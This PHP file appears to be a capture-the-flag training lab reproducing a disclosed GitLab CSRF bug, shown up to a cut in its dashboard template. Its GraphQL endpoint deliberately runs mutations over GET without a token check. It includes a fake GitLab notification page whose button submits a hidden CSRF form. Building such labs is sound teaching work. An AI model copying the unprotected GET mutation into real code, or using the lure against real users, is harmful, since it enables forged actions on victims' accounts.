<?php
// Lab 1303 — GitLab CSRF via GraphQL GET Mutation (HackerOne #1122408)
// Vulnerability: POST /gl/api/graphql is protected by X-CSRF-Token header,
// but GET /gl/api/graphql executes mutations with NO token check whatsoever.
// Any cross-origin page can submit a GET form to create snippets on the victim's account.
// Reporter: az3z3l | Severity: High | Bounty: $3,370 | Fixed: GitLab 14.0.2
// Flag: flag{gitlab_graphql_csrf_get_mutation_1122408}

session_start();

$db = new mysqli('localhost', 'root', '', 'KrazePlanet_DB');
if ($db->connect_error) {
    die('<h3 style="padding:32px;font-family:sans-serif;color:#c00">DB error: ' . htmlspecialchars($db->connect_error) . '</h3>');
}

$scheme       = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host         = $scheme . '://' . $_SERVER['HTTP_HOST'];
$loginUrl     = $host . '/index.php';
$dashboardUrl = $host . '/index.php?action=dashboard';
$logoutUrl    = $host . '/index.php?logout=1';
$graphqlUrl   = $host . '/index.php?action=graphql';
$attackUrl    = $host . '/index.php?attack=1';

define('LAB_FLAG', 'flag{gitlab_graphql_csrf_get_mutation_1122408}');

// ── Tables ────────────────────────────────────────────────────────────────────
$db->query("CREATE TABLE IF NOT EXISTS lab1303_users (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    email      VARCHAR(255) NOT NULL UNIQUE,
    password   VARCHAR(255) NOT NULL,
    username   VARCHAR(100) NOT NULL,
    name       VARCHAR(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$db->query("CREATE TABLE IF NOT EXISTS lab1303_snippets (
    id           INT AUTO_INCREMENT PRIMARY KEY,
    user_id      INT NOT NULL,
    title        VARCHAR(255) NOT NULL,
    content      TEXT NOT NULL,
    filename     VARCHAR(100) NOT NULL DEFAULT 'snippet.rb',
    visibility   ENUM('public','private','internal') DEFAULT 'private',
    csrf_created TINYINT DEFAULT 0,
    created_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

// ── Seed ──────────────────────────────────────────────────────────────────────
$sc = $db->query("SELECT COUNT(*) FROM lab1303_users WHERE email IN ('kai.jordan@gitlab.com','zoe.kim@gitlab.com','leo.santos@gitlab.com')")->fetch_row()[0];
if ($sc < 3) {
    $h1 = password_hash('kai@123', PASSWORD_BCRYPT);
    $h2 = password_hash('zoe@123', PASSWORD_BCRYPT);
    $h3 = password_hash('leo@123', PASSWORD_BCRYPT);
    $db->query("INSERT IGNORE INTO lab1303_users (email, password, username, name) VALUES
        ('kai.jordan@gitlab.com',  '$h1','kai_jordan','Kai Jordan'),
        ('zoe.kim@gitlab.com',     '$h2','zoe_kim',   'Zoe Kim'),
        ('leo.santos@gitlab.com',  '$h3','leo_santos','Leo Santos')");
}
$firstUser = $db->query("SELECT id FROM lab1303_users ORDER BY id ASC LIMIT 1")->fetch_assoc();
$uid = $firstUser ? $firstUser['id'] : 0;
if ($uid) {
    $snipCount = $db->query("SELECT COUNT(*) FROM lab1303_snippets WHERE user_id=$uid")->fetch_row()[0];
    if ($snipCount == 0) {
        $db->query("INSERT INTO lab1303_snippets (user_id, title, content, filename, visibility) VALUES
            ($uid, 'Deploy script for staging', '#!/bin/bash\n# Deployment helper\nexport ENV=staging\ndocker-compose up -d --build\necho \"Deploy complete\"', 'deploy.sh', 'private'),
            ($uid, 'GraphQL query examples', '# Fetch current user\nquery CurrentUser {\n  currentUser {\n    id\n    username\n    email\n  }\n}\n\n# List projects\nquery ListProjects {\n  projects {\n    nodes { id name }\n  }\n}', 'queries.graphql', 'internal')");
    }
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

// ── CSRF token ────────────────────────────────────────────────────────────────
if (empty($_SESSION['lab1303_csrf'])) {
    $_SESSION['lab1303_csrf'] = bin2hex(random_bytes(32));
}
$csrfToken = $_SESSION['lab1303_csrf'];

// ── Route detection ───────────────────────────────────────────────────────────
$isLogout = isset($_GET['logout']);
$isAttack = isset($_GET['attack']);
$isGraph  = ($_GET['action'] ?? '') === 'graphql';
$error    = '';

// ── Logout ────────────────────────────────────────────────────────────────────
if ($isLogout) {
    session_destroy();
    header('Location: ' . $loginUrl);
    exit;
}

// ── Load session user ─────────────────────────────────────────────────────────
$currentUser = null;
if (!empty($_SESSION['lab1303_uid'])) {
    $st = $db->prepare("SELECT * FROM lab1303_users WHERE id = ?");
    $st->bind_param('i', $_SESSION['lab1303_uid']);
    $st->execute();
    $currentUser = $st->get_result()->fetch_assoc();
    $st->close();
}

// ── GraphQL endpoint ──────────────────────────────────────────────────────────
if ($isGraph) {
    header('Content-Type: application/json');

    if (!$currentUser) {
        echo json_encode(['errors' => [['message' => '401 Unauthorized — you must be signed in']]]);
        exit;
    }

    $method = $_SERVER['REQUEST_METHOD'];

    // ── POST: protected by X-CSRF-Token ──────────────────────────────────────
    if ($method === 'POST') {
        $tokenHeader = $_SERVER['HTTP_X_CSRF_TOKEN'] ?? '';
        if (!hash_equals($csrfToken, $tokenHeader)) {
            http_response_code(403);
            echo json_encode(['errors' => [['message' => '403 Forbidden — X-CSRF-Token missing or invalid']]]);
            exit;
        }
        $body      = json_decode(file_get_contents('php://input'), true) ?? [];
        $query     = $body['query']     ?? '';
        $variables = $body['variables'] ?? [];
    } else {
        // ── GET: VULNERABLE — no token check at all ───────────────────────────
        $query     = $_GET['query']     ?? '';
        $variables = json_decode($_GET['variables'] ?? '{}', true) ?? [];
    }

    // ── Parse createSnippet mutation ──────────────────────────────────────────
    if (stripos($query, 'createSnippet') !== false) {
        $input      = $variables['input'] ?? [];
        $title      = trim($input['title']       ?? 'Untitled');
        $content    = trim($input['content']      ?? '(no content)');
        $filename   = trim($input['filePath']     ?? 'snippet.txt');
        $visibility = in_array($input['visibilityLevel'] ?? '', ['public','private','internal'])
                        ? strtolower($input['visibilityLevel'])
                        : 'public';
        $isCsrf     = ($method === 'GET') ? 1 : 0;
        $uid        = $currentUser['id'];

        // Inject flag into CSRF-created snippet content
        if ($isCsrf) {
            $content .= "\n\n# " . LAB_FLAG;
        }

        $st = $db->prepare("INSERT INTO lab1303_snippets (user_id, title, content, filename, visibility, csrf_created) VALUES (?, ?, ?, ?, ?, ?)");
        $st->bind_param('issssi', $uid, $title, $content, $filename, $visibility, $isCsrf);
        $st->execute();
        $st->close();

        $webUrl = $dashboardUrl;
        echo json_encode([
            'data' => [
                'createSnippet' => [
                    'errors'  => [],
                    'snippet' => [
                        'webUrl'     => $webUrl,
                        '__typename' => 'Snippet',
                    ],
                    'needsCaptchaResponse' => false,
                    'captchaSiteKey'       => null,
                    '__typename'           => 'CreateSnippetPayload',
                ],
            ],
        ]);
        exit;
    }

    echo json_encode(['errors' => [['message' => 'Unknown or unsupported mutation']]]);
    exit;
}

// ── POST: Login ───────────────────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$isAttack && !$isGraph) {
    $email = trim($_POST['email'] ?? '');
    $pwd   = $_POST['password']    ?? '';
    if ($email && $pwd) {
        $st = $db->prepare("SELECT * FROM lab1303_users WHERE email = ?");
        $st->bind_param('s', $email);
        $st->execute();
        $row = $st->get_result()->fetch_assoc();
        $st->close();
        if ($row && password_verify($pwd, $row['password'])) {
            session_regenerate_id(true);
            $_SESSION['lab1303_uid'] = $row['id'];
            header('Location: ' . $dashboardUrl);
            exit;
        }
        $error = 'Invalid email or password.';
    } else {
        $error = 'Email and password are required.';
    }
}

// ── Redirect logged-in user away from login page ──────────────────────────────
$action = $_GET['action'] ?? '';
$isLoginPage = !$currentUser && !$isAttack && !$isGraph;
if ($currentUser && !$isAttack && !$action) {
    header('Location: ' . $dashboardUrl);
    exit;
}

// ── Load snippets for dashboard ───────────────────────────────────────────────
$snippets = [];
if ($currentUser) {
    $st = $db->prepare("SELECT * FROM lab1303_snippets WHERE user_id = ? ORDER BY created_at DESC");
    $st->bind_param('i', $currentUser['id']);
    $st->execute();
    $snippets = $st->get_result()->fetch_all(MYSQLI_ASSOC);
    $st->close();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<?php if ($isAttack): ?>
<title>GitLab Notification — You've been mentioned</title>
<?php elseif ($currentUser): ?>
<title>Snippets · dev_researcher · GitLab</title>
<?php else: ?>
<title>Sign in · GitLab</title>
<?php endif; ?>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;min-height:100vh;}

/* ═══════════════════════════════════════════════════════════════════════════
   GITLAB PAGES (login / dashboard)
   ═══════════════════════════════════════════════════════════════════════════ */

/* ── GitLab top bar ──────────────────────────────────────────────────────── */
.gl-topbar{background:#1f1f1f;height:48px;display:flex;align-items:center;padding:0 16px;gap:0;position:sticky;top:0;z-index:100;border-bottom:1px solid #2f2f2f;}
.gl-logo-wrap{display:flex;align-items:center;gap:10px;text-decoration:none;color:#fff;padding:0 12px 0 0;border-right:1px solid #3a3a3a;margin-right:4px;}
.gl-tanuki{width:24px;height:24px;flex-shrink:0;}
.gl-logo-text{font-size:.9rem;font-weight:700;color:#fff;letter-spacing:-.01em;}
.gl-nav-item{display:flex;align-items:center;gap:5px;color:rgba(255,255,255,.65);text-decoration:none;font-size:.82rem;padding:6px 10px;border-radius:4px;transition:all .12s;font-weight:500;}
.gl-nav-item:hover,.gl-nav-item.active{color:#fff;background:rgba(255,255,255,.08);}
.gl-nav-right{margin-left:auto;display:flex;align-items:center;gap:6px;}
.gl-avatar{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,#e24329,#fc6d26);display:flex;align-items:center;justify-content:center;font-size:.65rem;font-weight:800;color:#fff;cursor:default;flex-shrink:0;}
.gl-topbar-btn{background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);border-radius:4px;padding:4px 9px;font-size:.75rem;font-weight:600;color:rgba(255,255,255,.7);cursor:pointer;font-family:inherit;transition:all .12s;}
.gl-topbar-btn:hover{background:rgba(255,255,255,.12);color:#fff;}
.gl-signout{font-size:.72rem;color:rgba(255,255,255,.35);text-decoration:none;padding:4px 8px;border-radius:4px;}
.gl-signout:hover{color:#fff;background:rgba(255,255,255,.07);}

/* ── Sidebar ─────────────────────────────────────────────────────────────── */
.gl-layout{display:flex;min-height:calc(100vh - 48px);background:#1c1c1e;}
.gl-sidebar{width:220px;background:#1f1f1f;border-right:1px solid #2f2f2f;flex-shrink:0;padding:16px 0;}
.gl-sb-section{font-size:.56rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:rgba(255,255,255,.3);padding:12px 16px 4px;margin-top:6px;}
.gl-sb-link{display:flex;align-items:center;gap:9px;padding:7px 16px;font-size:.8rem;color:rgba(255,255,255,.55);text-decoration:none;transition:all .12s;border-left:2px solid transparent;font-weight:500;}
.gl-sb-link:hover{color:#fff;background:rgba(255,255,255,.05);}
.gl-sb-link.active{color:#fff;background:rgba(252,109,38,.1);border-left-color:#fc6d26;font-weight:600;}
.gl-sb-link svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:1.8;flex-shrink:0;}
.gl-sb-count{margin-left:auto;background:#2f2f2f;border-radius:10px;padding:1px 6px;font-size:.6rem;font-weight:700;color:rgba(255,255,255,.5);}

/* ── Main content ────────────────────────────────────────────────────────── */
.gl-main{flex:1;padding:24px 28px;overflow-y:auto;background:#1c1c1e;}
.gl-page-title{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;}
.gl-h1{font-size:1.15rem;font-weight:700;color:#fff;}
.gl-breadcrumb{font-size:.75rem;color:rgba(255,255,255,.35);margin-bottom:4px;}
.gl-breadcrumb a{color:rgba(255,255,255,.5);text-decoration:none;}
.gl-breadcrumb a:hover{color:#fff;}

/* ── Snippet card ────────────────────────────────────────────────────────── */
.gl-snippet-list{display:flex;flex-direction:column;gap:12px;}
.gl-snippet{background:#252526;border:1px solid #2f2f2f;border-radius:6px;overflow:hidden;transition:border-color .15s;}
.gl-snippet:hover{border-color:#3f3f3f;}
.gl-snippet.csrf-created{border-color:rgba(252,109,38,.4);box-shadow:0 0 0 1px rgba(252,109,38,.15);}
.gl-snip-header{padding:12px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #2f2f2f;}
.gl-snip-icon{width:28px;height:28px;background:#2a2a2a;border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.gl-snip-icon svg{width:14px;height:14px;fill:rgba(255,255,255,.5);}
.gl-snip-title{font-size:.88rem;font-weight:700;color:#fff;flex:1;}
.gl-snip-meta{display:flex;align-items:center;gap:6px;margin-left:auto;flex-shrink:0;}
.gl-badge{display:inline-flex;align-items:center;gap:3px;padding:2px 7px;border-radius:3px;font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.04em;}
.badge-public{background:#0a2d1e;border:1px solid #1a5c3a;color:#2da160;}
.badge-private{background:#1a1a2e;border:1px solid #2a2a4e;color:#7c7ccc;}
.badge-internal{background:#2d1a00;border:1px solid #5c3a00;color:#c97b00;}
.badge-csrf{background:rgba(252,109,38,.12);border:1px solid rgba(252,109,38,.3);color:#fc6d26;}
.gl-snip-lang{font-size:.62rem;background:#2f2f2f;border:1px solid #3f3f3f;border-radius:3px;padding:2px 7px;color:rgba(255,255,255,.4);font-weight:600;}
.gl-snip-body{background:#1a1a1c;border-radius:0;}
.gl-snip-code{padding:12px 16px;font-family:'Courier New',Courier,monospace;font-size:.76rem;color:#e2e2e2;white-space:pre-wrap;word-break:break-all;max-height:120px;overflow:hidden;line-height:1.5;}
.gl-snip-code.expanded{max-height:none;}
.gl-snip-footer{padding:8px 16px;display:flex;align-items:center;gap:10px;background:#252526;border-top:1px solid #2a2a2a;}
.gl-snip-date{font-size:.68rem;color:rgba(255,255,255,.3);}
.gl-flag-banner{background:linear-gradient(135deg,rgba(252,109,38,.15),rgba(255,71,87,.1));border:1px solid rgba(252,109,38,.35);border-radius:6px;padding:14px 16px;margin-bottom:20px;display:flex;align-items:center;gap:12px;}
.gl-flag-icon{font-size:1.4rem;flex-shrink:0;}
.gl-flag-label{font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:#fc6d26;margin-bottom:3px;}
.gl-flag-val{font-family:'Courier New',monospace;font-size:.82rem;color:#fff;font-weight:700;word-break:break-all;}

/* ── New snippet form ────────────────────────────────────────────────────── */
.gl-new-btn{display:inline-flex;align-items:center;gap:6px;background:#1f75cb;border:none;border-radius:4px;padding:7px 14px;font-size:.8rem;font-weight:600;color:#fff;cursor:pointer;font-family:inherit;transition:background .12s;}
.gl-new-btn:hover{background:#1a6abf;}
.gl-new-btn svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2.5;}
.gl-form-panel{background:#252526;border:1px solid #2f2f2f;border-radius:6px;padding:20px;margin-bottom:20px;display:none;}
.gl-form-panel.open{display:block;}
.gl-form-title{font-size:.9rem;font-weight:700;color:#fff;margin-bottom:16px;display:flex;align-items:center;gap:8px;}
.gl-form-title svg{width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:2;}
.gl-field{margin-bottom:14px;}
.gl-field label{display:block;font-size:.72rem;font-weight:600;color:#9CA3AF;text-transform:uppercase;letter-spacing:.06em;margin-bottom:5px;}
.gl-field input,.gl-field select,.gl-field textarea{width:100%;background:#1a1a1c;border:1px solid #3f3f3f;border-radius:4px;padding:8px 11px;font-size:.83rem;color:#e2e2e2;font-family:inherit;outline:none;transition:border-color .15s;}
.gl-field input:focus,.gl-field select:focus,.gl-field textarea:focus{border-color:#1f75cb;box-shadow:0 0 0 2px rgba(31,117,203,.15);}
.gl-field textarea{font-family:'Courier New',monospace;resize:vertical;min-height:80px;}
.gl-field select option{background:#2a2a2a;}
.gl-form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
.gl-submit-row{display:flex;align-items:center;gap:10px;margin-top:4px;}
.gl-submit-btn{background:#1f75cb;border:none;border-radius:4px;padding:8px 16px;font-size:.82rem;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;}
.gl-submit-btn:hover{background:#1a6abf;}
.gl-cancel-btn{background:transparent;border:1px solid #3f3f3f;border-radius:4px;padding:8px 14px;font-size:.82rem;font-weight:600;color:rgba(255,255,255,.5);cursor:pointer;font-family:inherit;}
.gl-cancel-btn:hover{border-color:#5f5f5f;color:#fff;}
.gl-csrf-note{font-size:.7rem;color:rgba(255,255,255,.3);margin-left:auto;}
.gl-error-banner{background:#2d0a0a;border:1px solid #7f1d1d;border-radius:4px;padding:10px 14px;font-size:.78rem;color:#fca5a5;margin-bottom:16px;}

/* ── Login page ──────────────────────────────────────────────────────────── */
.gl-login-body{background:#1c1c1e;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:40px 16px;}
.gl-login-wrap{display:flex;flex-direction:column;align-items:center;width:100%;max-width:380px;}
.gl-login-logo{display:flex;align-items:center;gap:10px;margin-bottom:28px;}
.gl-login-logo-text{font-size:1.5rem;font-weight:800;color:#fff;letter-spacing:-.02em;}
.gl-login-card{background:#252526;border:1px solid #2f2f2f;border-radius:8px;width:100%;padding:28px 28px 24px;box-shadow:0 8px 40px rgba(0,0,0,.5);}
.gl-login-title{font-size:1rem;font-weight:700;color:#fff;text-align:center;margin-bottom:22px;}
.gl-field input{color:#e2e2e2;}
.gl-field input::placeholder{color:#4a4a4a;}
.gl-login-divider{display:flex;align-items:center;gap:10px;margin:14px 0;color:#3f3f3f;font-size:.72rem;}
.gl-login-divider::before,.gl-login-divider::after{content:'';flex:1;height:1px;background:#2f2f2f;}
.gl-social-btn{width:100%;background:#2a2a2a;border:1px solid #3f3f3f;border-radius:4px;padding:8px;font-size:.8rem;font-weight:600;color:#888;cursor:default;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px;}
.gl-social-btn svg{width:15px;height:15px;fill:currentColor;flex-shrink:0;}
.gl-login-sub{text-align:center;margin-top:16px;font-size:.75rem;color:#6B7280;}
.gl-login-sub a{color:#1f75cb;text-decoration:none;}
.gl-login-sub a:hover{text-decoration:underline;}
.gl-login-submit{width:100%;background:#1f75cb;border:none;border-radius:4px;padding:9px;font-size:.86rem;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;margin-top:4px;transition:background .15s;}
.gl-login-submit:hover{background:#1a6abf;}

/* ── Empty state ─────────────────────────────────────────────────────────── */
.gl-empty{text-align:center;padding:48px 24px;color:rgba(255,255,255,.3);}
.gl-empty svg{width:48px;height:48px;stroke:currentColor;fill:none;stroke-width:1.2;margin-bottom:12px;opacity:.4;}
.gl-empty p{font-size:.85rem;}

/* ═══════════════════════════════════════════════════════════════════════════
   ATTACK PAGE — fake GitLab notification email
   ═══════════════════════════════════════════════════════════════════════════ */
.atk-wrap{background:#f0f0f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:40px 16px;}
.atk-email{background:#fff;border-radius:8px;max-width:560px;width:100%;box-shadow:0 4px 24px rgba(0,0,0,.12);overflow:hidden;}
.atk-email-hdr{background:#1f1f1f;padding:16px 24px;display:flex;align-items:center;gap:10px;}
.atk-email-hdr-logo{display:flex;align-items:center;gap:8px;}
.atk-email-hdr-title{color:#fff;font-size:.85rem;font-weight:700;}
.atk-email-body{padding:28px 28px 20px;}
.atk-email-greeting{font-size:.95rem;color:#222;font-weight:600;margin-bottom:8px;}
.atk-email-text{font-size:.84rem;color:#444;line-height:1.6;margin-bottom:16px;}
.atk-email-quote{background:#f8f9fa;border-left:3px solid #e24329;border-radius:0 4px 4px 0;padding:10px 14px;font-size:.8rem;color:#333;margin-bottom:18px;font-style:italic;}
.atk-email-btn{display:inline-block;background:#1f75cb;color:#fff;text-decoration:none;border-radius:4px;padding:10px 22px;font-size:.88rem;font-weight:700;border:none;cursor:pointer;font-family:inherit;transition:background .15s;}
.atk-email-btn:hover{background:#1a6abf;}
.atk-email-divider{height:1px;background:#eee;margin:20px 0;}
.atk-email-footer{font-size:.7rem;color:#aaa;line-height:1.5;}
.atk-loading{display:none;text-align:center;padding:16px;font-size:.82rem;color:#777;}
.atk-email-meta{background:#f8f9fa;border-top:1px solid #eee;padding:12px 24px;font-size:.68rem;color:#aaa;display:flex;justify-content:space-between;}
</style>
</head>
<body>

<?php if ($isAttack): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     ATTACK PAGE — Fake GitLab Notification Email
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="atk-wrap">
  <div class="atk-email">
    <div class="atk-email-hdr">
      <div class="atk-email-hdr-logo">
        <svg class="gl-tanuki" viewBox="0 0 380 380" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M190 350L287 55H93L190 350Z" fill="#e24329"/>
          <path d="M190 350L93 55L10 55L190 350Z" fill="#fc6d26"/>
          <path d="M10 55L62 215L190 350L10 55Z" fill="#fca326"/>
          <path d="M190 350L287 55L370 55L190 350Z" fill="#fc6d26"/>
          <path d="M370 55L318 215L190 350L370 55Z" fill="#fca326"/>
        </svg>
        <span class="atk-email-hdr-title">GitLab</span>
      </div>
      <span style="margin-left:auto;font-size:.65rem;color:#888;">notifications@gitlab.com</span>
    </div>
    <div class="atk-email-body">
      <div class="atk-email-greeting">👋 Hey dev_researcher,</div>
      <p class="atk-email-text">
        <strong>az3z3l</strong> mentioned you in a snippet comment on <strong>gitlab.com</strong>.<br>
        Please review the comment below and respond at your earliest convenience.
      </p>
      <div class="atk-email-quote">
        "@dev_researcher can you verify the deploy script attached here? I added some changes to the staging config. Need your approval before merge."
      </div>
      <p class="atk-email-text" style="margin-bottom:20px;">
        Click the button below to view the snippet and leave a reply.
      </p>

      <!-- ⚠ CSRF: GET form auto-submits to /gl/api/graphql with createSnippet mutation.
           No X-CSRF-Token needed for GET — the vulnerability.
           The snippet is created on the victim's account silently. -->
      <form id="csrfForm" action="/index.php" method="GET" style="display:none;">
        <input type="hidden" name="action" value="graphql">
        <input type="hidden" name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $input) {    errors    snippet {      webUrl      __typename    }    needsCaptchaResponse    captchaSiteKey    __typename  }}">
        <input type="hidden" name="variables" value='{"input":{"title":"CSRF Proof of Concept","description":"Auto-created via CSRF GET mutation","visibilityLevel":"public","blobActions":[{"action":"create","previousPath":"readme.md","content":"This snippet was created by a CSRF attack via GET /gl/api/graphql — no token required!","filePath":"readme.md"}],"uploadedFiles":[],"projectPath":"","content":"This snippet was created by a CSRF attack via GET /gl/api/graphql — no token required!","filePath":"exploit.md"}}'>
      </form>

      <button class="atk-email-btn" id="viewBtn" onclick="fireCSRF()">
        View Comment on GitLab →
      </button>
      <div class="atk-loading" id="loading">⏳ Connecting to GitLab…</div>

      <div class="atk-email-divider"></div>
      <p class="atk-email-footer">
        You are receiving this email because you are a member of the gitlab.com project.<br>
        <a href="#" style="color:#1f75cb;">Manage notification preferences</a> · <a href="#" style="color:#1f75cb;">Unsubscribe</a>
      </p>
    </div>
    <div class="atk-email-meta">
      <span>GitLab Notifications · gitlab.com</span>
      <span>Mar 10, 2021, 4:49 PM UTC</span>
    </div>
  </div>
</div>

<script>
function fireCSRF() {
    document.getElementById('viewBtn').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    document.getElementById('csrfForm').submit();
}
</script>

<?php elseif ($currentUser): ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     DASHBOARD — Snippets
     ══════════════════════════════════════════════════════════════════════════ -->
<header class="gl-topbar">
  <a href="/index.php?action=dashboard" class="gl-logo-wrap">
    <svg class="gl-tanuki" viewBox="0 0 380 380" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M190 350L287 55H93L190 350Z" fill="#e24329"/>
      <path d="M190 350L93 55L10 55L190 350Z" fill="#fc6d26"/>
      <path d="M10 55L62 215L190 350L10 55Z" fill="#fca326"/>
      <path d="M190 350L287 55L370 55L190 350Z" fill="#fc6d26"/>
      <path d="M370 55L318 215L190 350L370 55Z" fill="#fca326"/>
    </svg>
    <span class="gl-logo-text">GitLab</span>
  </a>
  <a href="#" class="gl-nav-item">Projects</a>
  <a href="#" class="gl-nav-item">Groups</a>
  <a href="#" class="gl-nav-item">Activity</a>
  <a href="/index.php?action=dashboard" class="gl-nav-item active">Snippets</a>
  <div class="gl-nav-right">
    <div class="gl-avatar"><?= strtoupper(substr($currentUser['username'], 0, 2)) ?></div>
    <span style="font-size:.8rem;color:rgba(255,255,255,.7);padding:0 6px;"><?= esc($currentUser['name']) ?></span>
    <a href="/index.php?logout=1" class="gl-signout">Sign out</a>
  </div>
</header>

<div class="gl-layout">
  <aside class="gl-sidebar">
    <div class="gl-sb-section">Main menu</div>
    <a href="#" class="gl-sb-link">
      <svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/></svg>
      Your work
    </a>
    <a href="#" class="gl-sb-link">
      <svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
      Projects
    </a>
    <a href="#" class="gl-sb-link">
      <svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>
      Groups
    </a>
    <a href="#" class="gl-sb-link">
      <svg viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
      Activity
    </a>
    <div class="gl-sb-section">Your profile</div>
    <a href="/index.php?action=dashboard" class="gl-sb-link active">
      <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
      Snippets
      <span class="gl-sb-count"><?= count($snippets) ?></span>
    </a>
    <a href="#" class="gl-sb-link">
      <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
      Profile
    </a>
    <div class="gl-sb-section">Tools</div>
    <a href="#" class="gl-sb-link">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 010 14.14M4.93 4.93a10 10 0 000 14.14"/></svg>
      API access
    </a>
    <a href="/index.php?logout=1" class="gl-sb-link" style="color:rgba(239,68,68,.5);margin-top:12px;">
      <svg viewBox="0 0 24 24"><path d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
      Sign out
    </a>
  </aside>

  <main class="gl-main">
    <div class="gl-breadcrumb"><a href="#"><?= esc($currentUser['username']) ?></a> › Snippets</div>
    <div class="gl-page-title">
      <div class="gl-h1">Your Snippets</div>
      <button class="gl-new-btn" onclick="toggleForm()">
        <svg viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
        New snippet
      </button>
    </div>

    <!-- New snippet form (POST — X-CSRF-Token protected) -->
    <div class="gl-form-panel" id="newSnipForm">
      <div class="gl-form-title">
        <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
        New Snippet
      </div>
      <div class="gl-form-row">
        <div class="gl-field">
          <label>Title</label>
          <input type="text" id="snipTitle" placeholder="My awesome snippet" value="">
        </div>
        <div class="gl-field">
          <label>Filename</label>
          <input type="text" id="snipFilename" placeholder="snippet.rb" value="">
        </div>
      </div>
      <div class="gl-field">
        <label>Content</label>
        <textarea id="snipContent" rows="5" placeholder="# Your code here"></textarea>
      </div>
      <div class="gl-field">
        <label>Visibility</label>
        <select id="snipVis">
          <option value="private">Private — only you</option>
          <option value="internal">Internal — logged-in users</option>
          <option value="public">Public — everyone</option>
        </select>
      </div>
      <div class="gl-submit-row">
        <button class="gl-submit-btn" onclick="createSnippetPost()">Create snippet</button>
        <button class="gl-cancel-btn" onclick="toggleForm()">Cancel</button>
        <span class="gl-csrf-note">🔒 Sends X-CSRF-Token header</span>
      </div>
      <div id="formMsg" style="margin-top:10px;font-size:.76rem;display:none;"></div>
    </div>

    <?php
      $hasCsrfSnip = array_filter($snippets, fn($s) => $s['csrf_created']);
    ?>
    <?php if ($hasCsrfSnip): ?>
    <div class="gl-flag-banner">
      <div class="gl-flag-icon">🚨</div>
      <div>
        <div class="gl-flag-label">CSRF Attack Successful — Lab Flag</div>
        <div class="gl-flag-val"><?= LAB_FLAG ?></div>
      </div>
    </div>
    <?php endif; ?>

    <div class="gl-snippet-list">
      <?php if (empty($snippets)): ?>
      <div class="gl-empty">
        <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="12" y1="18" x2="12" y2="12"/><line x1="9" y1="15" x2="15" y2="15"/></svg>
        <p>No snippets yet. Create your first snippet.</p>
      </div>
      <?php else: ?>
      <?php foreach ($snippets as $s):
        $ext = pathinfo($s['filename'], PATHINFO_EXTENSION);
        $langMap = ['sh'=>'Bash','rb'=>'Ruby','py'=>'Python','js'=>'JavaScript','graphql'=>'GraphQL','md'=>'Markdown','txt'=>'Text','php'=>'PHP'];
        $lang = $langMap[$ext] ?? strtoupper($ext ?: 'Text');
        $badgeClass = 'badge-' . $s['visibility'];
        $isCsrf = (bool)$s['csrf_created'];
      ?>
